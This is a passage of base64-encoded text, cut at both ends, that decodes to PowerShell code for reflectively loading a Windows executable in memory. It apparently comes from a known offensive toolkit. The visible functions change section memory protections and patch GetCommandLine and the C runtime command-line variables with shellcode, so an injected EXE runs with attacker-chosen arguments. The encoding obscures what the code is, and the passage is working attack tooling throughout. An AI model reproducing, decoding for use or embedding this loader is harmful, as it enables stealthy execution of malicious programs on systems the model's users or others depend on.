hbCgkUHJvY2VkdXJlTmFtZVB0cikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgIH0KCQkJCX0KCQkJCQoJCQkJJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEltcG9ydERlc2NyaXB0b3JQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpKQoJCQl9CgkJfQoJfQoKCUZ1bmN0aW9uIEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbVUludDMyXQoJCSRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzCgkJKQoJCQoJCSRQcm90ZWN0aW9uRmxhZyA9IDB4MAoJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fRVhFQ1VURSkgLWd0IDApCgkJewoJCQlpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1JFQUQpIC1ndCAwKQoJCQl7CgkJCQlpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKCQkJCXsKCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURQoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRAoJCQkJfQoJCQl9CgkJCWVsc2UKCQkJewoJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9XUklURUNPUFkKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQkkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFCgkJCQl9CgkJCX0KCQl9CgkJZWxzZQoJCXsKCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9SRUFEKSAtZ3QgMCkKCQkJewoJCQkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRE9OTFkKCQkJCX0KCQkJfQoJCQllbHNlCgkJCXsKCQkJCWlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX1dSSVRFQ09QWQoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQUNDRVNTCgkJCQl9CgkJCX0KCQl9CgkJCgkJaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEKSAtZ3QgMCkKCQl7CgkJCSRQcm90ZWN0aW9uRmxhZyA9ICRQcm90ZWN0aW9uRmxhZyAtYm9yICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQ0FDSEUKCQl9CgkJCgkJcmV0dXJuICRQcm90ZWN0aW9uRmxhZwoJfQoKCUZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlQcm90ZWN0aW9uRmxhZ3MKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRQRUluZm8sCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJGdW5jdGlvbnMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJDb25zdGFudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcwoJCSkKCQkKCQlmb3IoICRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspCgkJewoJCQlbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlNlY3Rpb25IZWFkZXJQdHIpICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikpKQoJCQkkU2VjdGlvbkhlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRTZWN0aW9uSGVhZGVyUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikKCQkJW0ludFB0cl0kU2VjdGlvblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFNlY3Rpb25IZWFkZXIuVmlydHVhbEFkZHJlc3MpCgkJCQoJCQlbVUludDMyXSRQcm90ZWN0RmxhZyA9IEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlICRTZWN0aW9uSGVhZGVyLkNoYXJhY3RlcmlzdGljcwoJCQlbVUludDMyXSRTZWN0aW9uU2l6ZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCgkJCQoJCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKCQkJVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFnczo6VmlydHVhbFByb3RlY3QiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uUHRyIC1TaXplICRTZWN0aW9uU2l6ZSB8IE91dC1OdWxsCgkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkU2VjdGlvblB0ciwgJFNlY3Rpb25TaXplLCAkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQkJewoJCQkJVGhyb3cgIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHByb3RlY3Rpb24iCgkJCX0KCQl9Cgl9CgkKCSNUaGlzIGZ1bmN0aW9uIG92ZXJ3cml0ZXMgR2V0Q29tbWFuZExpbmUgYW5kIEV4aXRUaHJlYWQgd2hpY2ggYXJlIG5lZWRlZCB0byByZWZsZWN0aXZlbHkgbG9hZCBhbiBFWEUKCSNSZXR1cm5zIGFuIG9iamVjdCB3aXRoIGFkZHJlc3NlcyB0byBjb3BpZXMgb2YgdGhlIGJ5dGVzIHRoYXQgd2VyZSBvdmVyd3JpdHRlbiAoYW5kIHRoZSBjb3VudCkKCUZ1bmN0aW9uIFVwZGF0ZS1FeGVGdW5jdGlvbnMKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRQRUluZm8sCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJGdW5jdGlvbnMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJDb25zdGFudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3RyaW5nXQoJCSRFeGVBcmd1bWVudHMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50UHRyXQoJCSRFeGVEb25lQnl0ZVB0cgoJCSkKCQkKCQkjVGhpcyB3aWxsIGJlIGFuIGFycmF5IG9mIGFycmF5cy4gVGhlIGlubmVyIGFycmF5IHdpbGwgY29uc2lzdCBvZjogQCgkRGVzdEFkZHIsICRTb3VyY2VBZGRyLCAkQnl0ZUNvdW50KS4gVGhpcyBpcyB1c2VkIHRvIHJldHVybiBtZW1vcnkgdG8gaXRzIG9yaWdpbmFsIHN0YXRlLgoJCSRSZXR1cm5BcnJheSA9IEAoKSAKCQkKCQkkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKCQlbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKCQkKCQlbSW50UHRyXSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJLZXJuZWwzMi5kbGwiKQoJCWlmICgkS2VybmVsMzJIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJdGhyb3cgIktlcm5lbDMyIGhhbmRsZSBudWxsIgoJCX0KCQkKCQlbSW50UHRyXSRLZXJuZWxCYXNlSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIktlcm5lbEJhc2UuZGxsIikKCQlpZiAoJEtlcm5lbEJhc2VIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJdGhyb3cgIktlcm5lbEJhc2UgaGFuZGxlIG51bGwiCgkJfQoKCQkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkJI0ZpcnN0IG92ZXJ3cml0ZSB0aGUgR2V0Q29tbWFuZExpbmUoKSBmdW5jdGlvbi4gVGhpcyBpcyB0aGUgZnVuY3Rpb24gdGhhdCBpcyBjYWxsZWQgYnkgYSBuZXcgcHJvY2VzcyB0byBnZXQgdGhlIGNvbW1hbmQgbGluZSBhcmdzIHVzZWQgdG8gc3RhcnQgaXQuCgkJIwlXZSBvdmVyd3JpdGUgaXQgd2l0aCBzaGVsbGNvZGUgdG8gcmV0dXJuIGEgcG9pbnRlciB0byB0aGUgc3RyaW5nIEV4ZUFyZ3VtZW50cywgYWxsb3dpbmcgdXMgdG8gcGFzcyB0aGUgZXhlIGFueSBhcmdzIHdlIHdhbnQuCgkJJENtZExpbmVXQXJnc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbFVuaSgkRXhlQXJndW1lbnRzKQoJCSRDbWRMaW5lQUFyZ3NQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRFeGVBcmd1bWVudHMpCgkKCQlbSW50UHRyXSRHZXRDb21tYW5kTGluZUFBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsQmFzZUhhbmRsZSwgIkdldENvbW1hbmRMaW5lQSIpCgkJW0ludFB0cl0kR2V0Q29tbWFuZExpbmVXQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbEJhc2VIYW5kbGUsICJHZXRDb21tYW5kTGluZVciKQoKCQlpZiAoJEdldENvbW1hbmRMaW5lQUFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvIC1vciAkR2V0Q29tbWFuZExpbmVXQWRkciAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQl0aHJvdyAiR2V0Q29tbWFuZExpbmUgcHRyIG51bGwuIEdldENvbW1hbmRMaW5lQTogJChHZXQtSGV4ICRHZXRDb21tYW5kTGluZUFBZGRyKS4gR2V0Q29tbWFuZExpbmVXOiAkKEdldC1IZXggJEdldENvbW1hbmRMaW5lV0FkZHIpIgoJCX0KCgkJI1ByZXBhcmUgdGhlIHNoZWxsY29kZQoJCVtCeXRlW11dJFNoZWxsY29kZTEgPSBAKCkKCQlpZiAoJFB0clNpemUgLWVxIDgpCgkJewoJCQkkU2hlbGxjb2RlMSArPSAweDQ4CSM2NGJpdCBzaGVsbGNvZGUgaGFzIHRoZSAweDQ4IGJlZm9yZSB0aGUgMHhiOAoJCX0KCQkkU2hlbGxjb2RlMSArPSAweGI4CgkJCgkJW0J5dGVbXV0kU2hlbGxjb2RlMiA9IEAoMHhjMykKCQkkVG90YWxTaXplID0gJFNoZWxsY29kZTEuTGVuZ3RoICsgJFB0clNpemUgKyAkU2hlbGxjb2RlMi5MZW5ndGgKCQkKCQkKCQkjTWFrZSBjb3B5IG9mIEdldENvbW1hbmRMaW5lQSBhbmQgR2V0Q29tbWFuZExpbmVXCgkJJEdldENvbW1hbmRMaW5lQU9yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQoJCSRHZXRDb21tYW5kTGluZVdPcmlnQnl0ZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRvdGFsU2l6ZSkKCQkkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyLCAkR2V0Q29tbWFuZExpbmVBQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCgkJJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEdldENvbW1hbmRMaW5lV09yaWdCeXRlc1B0ciwgJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50NjRdJFRvdGFsU2l6ZSkgfCBPdXQtTnVsbAoJCSRSZXR1cm5BcnJheSArPSAsKCRHZXRDb21tYW5kTGluZUFBZGRyLCAkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQoJCSRSZXR1cm5BcnJheSArPSAsKCRHZXRDb21tYW5kTGluZVdBZGRyLCAkR2V0Q29tbWFuZExpbmVXT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQoKCQkjT3ZlcndyaXRlIEdldENvbW1hbmRMaW5lQQoJCVtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAoJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVBQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCWlmICgkU3VjY2VzcyA9ICRmYWxzZSkKCQl7CgkJCXRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQl9CgkJCgkJJEdldENvbW1hbmRMaW5lQUFkZHJUZW1wID0gJEdldENvbW1hbmRMaW5lQUFkZHIKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMSAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAKCQkkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgKCRTaGVsbGNvZGUxLkxlbmd0aCkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ21kTGluZUFBcmdzUHRyLCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAsICRmYWxzZSkKCQkkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgJFB0clNpemUKCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkU2hlbGxjb2RlMiAtTWVtb3J5QWRkcmVzcyAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAKCQkKCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAoJCQoJCQoJCSNPdmVyd3JpdGUgR2V0Q29tbWFuZExpbmVXCgkJW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCgkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZVdBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCgkJaWYgKCRTdWNjZXNzID0gJGZhbHNlKQoJCXsKCQkJdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgoJCX0KCQkKCQkkR2V0Q29tbWFuZExpbmVXQWRkclRlbXAgPSAkR2V0Q29tbWFuZExpbmVXQWRkcgoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcAoJCSRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDbWRMaW5lV0FyZ3NQdHIsICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCwgJGZhbHNlKQoJCSRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCAkUHRyU2l6ZQoJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcAoJCQoJCSRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCgkJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJCQoJCQoJCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQkjRm9yIEMrKyBzdHVmZiB0aGF0IGlzIGNvbXBpbGVkIHdpdGggdmlzdWFsIHN0dWRpbyBhcyAibXVsdGl0aHJlYWRlZCBETEwiLCB0aGUgYWJvdmUgbWV0aG9kIG9mIG92ZXJ3cml0aW5nIEdldENvbW1hbmRMaW5lIGRvZXNuJ3Qgd29yay4KCQkjCUkgZG9uJ3Qga25vdyB3aHkgZXhhY3RseS4uIEJ1dCB0aGUgbXN2Y3IgRExMIHRoYXQgYSAiRExMIGNvbXBpbGVkIGV4ZWN1dGFibGUiIGltcG9ydHMgaGFzIGFuIGV4cG9ydCBjYWxsZWQgX2FjbWRsbiBhbmQgX3djbWRsbi4KCQkjCUl0IGFwcGVhcnMgdG8gY2FsbCBHZXRDb21tYW5kTGluZSBhbmQgc3RvcmUgdGhlIHJlc3VsdCBpbiB0aGlzIHZhci4gVGhlbiB3aGVuIHlvdSBjYWxsIF9fd2dldGNtZGxuIGl0IHBhcnNlcyBhbmQgcmV0dXJucyB0aGUKCQkjCWFyZ3YgYW5kIGFyZ2MgdmFsdWVzIHN0b3JlZCBpbiB0aGVzZSB2YXJpYWJsZXMuIFNvIHRoZSBlYXN5IHRoaW5nIHRvIGRvIGlzIGp1c3Qgb3ZlcndyaXRlIHRoZSB2YXJpYWJsZSBzaW5jZSB0aGV5IGFyZSBleHBvcnRlZC4KCQkkRGxsTGlzdCA9IEAoIm1zdmNyNzBkLmRsbCIsICJtc3ZjcjcxZC5kbGwiLCAibXN2Y3I4MGQuZGxsIiwgIm1zdmNyOTBkLmRsbCIsICJtc3ZjcjEwMGQuZGxsIiwgIm1zdmNyMTEwZC5kbGwiLCAibXN2Y3I3MC5kbGwiIGAKCQkJLCAibXN2Y3I3MS5kbGwiLCAibXN2Y3I4MC5kbGwiLCAibXN2Y3I5MC5kbGwiLCAibXN2Y3IxMDAuZGxsIiwgIm1zdmNyMTEwLmRsbCIpCgkJCgkJZm9yZWFjaCAoJERsbCBpbiAkRGxsTGlzdCkKCQl7CgkJCVtJbnRQdHJdJERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCREbGwpCgkJCWlmICgkRGxsSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJW0ludFB0cl0kV0NtZExuQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJERsbEhhbmRsZSwgIl93Y21kbG4iKQoJCQkJW0ludFB0cl0kQUNtZExuQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJERsbEhhbmRsZSwgIl9hY21kbG4iKQoJCQkJaWYgKCRXQ21kTG5BZGRyIC1lcSBbSW50UHRyXTo6WmVybyAtb3IgJEFDbWRMbkFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQkJewoJCQkJCSJFcnJvciwgY291bGRuJ3QgZmluZCBfd2NtZGxuIG9yIF9hY21kbG4iCgkJCQl9CgkJCQkKCQkJCSROZXdBQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRFeGVBcmd1bWVudHMpCgkJCQkkTmV3V0NtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCRFeGVBcmd1bWVudHMpCgkJCQkKCQkJCSNNYWtlIGEgY29weSBvZiB0aGUgb3JpZ2luYWwgY2hhciogYW5kIHdjaGFyX3QqIHNvIHRoZXNlIHZhcmlhYmxlcyBjYW4gYmUgcmV0dXJuZWQgYmFjayB0byB0aGVpciBvcmlnaW5hbCBzdGF0ZQoJCQkJJE9yaWdBQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkQUNtZExuQWRkciwgW1R5cGVdW0ludFB0cl0pCgkJCQkkT3JpZ1dDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRXQ21kTG5BZGRyLCBbVHlwZV1bSW50UHRyXSkKCQkJCSRPcmlnQUNtZExuUHRyU3RvcmFnZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKCQkJCSRPcmlnV0NtZExuUHRyU3RvcmFnZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRPcmlnQUNtZExuUHRyLCAkT3JpZ0FDbWRMblB0clN0b3JhZ2UsICRmYWxzZSkKCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRPcmlnV0NtZExuUHRyLCAkT3JpZ1dDbWRMblB0clN0b3JhZ2UsICRmYWxzZSkKCQkJCSRSZXR1cm5BcnJheSArPSAsKCRBQ21kTG5BZGRyLCAkT3JpZ0FDbWRMblB0clN0b3JhZ2UsICRQdHJTaXplKQoJCQkJJFJldHVybkFycmF5ICs9ICwoJFdDbWRMbkFkZHIsICRPcmlnV0NtZExuUHRyU3RvcmFnZSwgJFB0clNpemUpCgkJCQkKCQkJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkQUNtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKCQkJCWlmICgkU3VjY2VzcyA9ICRmYWxzZSkKCQkJCXsKCQkJCQl0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCgkJCQl9CgkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3QUNtZExuUHRyLCAkQUNtZExuQWRkciwgJGZhbHNlKQoJCQkJJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkQUNtZExuQWRkciwgW1VJbnQzMl0kUHRyU2l6ZSwgW1VJbnQzMl0oJE9sZFByb3RlY3RGbGFnKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKCQkJCQoJCQkJJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRXQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQoJCQkJaWYgKCRTdWNjZXNzID0gJGZhbHNlKQoJCQkJewoJCQkJCXRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKCQkJCX0KCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCROZXdXQ21kTG5QdHIsICRXQ21kTG5BZGRyLC